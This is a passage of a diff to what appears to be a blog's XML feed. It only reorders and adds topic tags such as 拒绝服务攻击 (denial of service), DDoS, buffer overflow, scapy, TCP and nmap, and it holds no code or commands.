             <tag> 拒绝服务攻击 </tag>
             
             <tag> scapy </tag>
+            
+            <tag> DoS攻击 </tag>
             
             <tag> TCP </tag>
             
@@ -3878,13 +3959,13 @@
       
         <tags>
             
+            <tag> 拒绝服务攻击 </tag>
+            
             <tag> DoS攻击 </tag>
             
             <tag> DDoS攻击 </tag>
             
             <tag> CC </tag>
-            
-            <tag> 拒绝服务攻击 </tag>
             
             <tag> 缓冲区溢出 </tag>
             
@@ -4139,11 +4220,11 @@
             
             <tag> python </tag>
             
+            <tag> TCP </tag>
+            
             <tag> UDP </tag>
             
             <tag> nmap </tag>
-            
-            <tag> TCP </tag>
             
             <tag> Scapy </tag>
             
